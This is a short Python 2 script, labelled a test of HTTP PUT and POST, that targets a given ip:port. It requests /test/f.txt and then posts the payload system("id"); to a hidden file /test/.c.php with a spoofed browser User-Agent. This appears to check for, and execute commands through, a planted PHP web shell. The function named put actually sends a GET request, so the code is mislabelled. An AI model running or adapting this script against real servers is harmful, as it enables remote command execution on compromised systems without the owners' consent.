#!/usr/bin/env python
#-*- coding:utf-8 -*-
'''
    Test for http put and post by requests
'''

import requests
import sys

def put(url,headers,data=None):
    r = requests.get(url,params=data,headers=headers,timeout=5)
    if r.status_code == requests.codes.ok:
        return r.text.strip()
    else:
        return r.status_code

def post(url,headers,data=None):
    r = requests.post(url,data=data,headers=headers,timeout=5)
    if r.status_code == requests.codes.ok:
        return r.text.strip()
    else:
        return r.status_code

def main():
    if len(sys.argv) < 2:
        print 'Usage:%s <ip:port>' %sys.argv[0]
        exit()
    #
    url = 'http://%s' %sys.argv[1]
    headers = {
        'User-Agent': 'Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)'
    }
    #
    data = {'o':'system("id");'}
    #
    r = put("%s/test/f.txt"%url,headers)
    print "%s:%s" %(sys.argv[1],r)
    r = post("%s/test/.c.php"%url,headers,data)
    print "%s:%s" %(sys.argv[1],r)

if __name__ == '__main__':
    main()
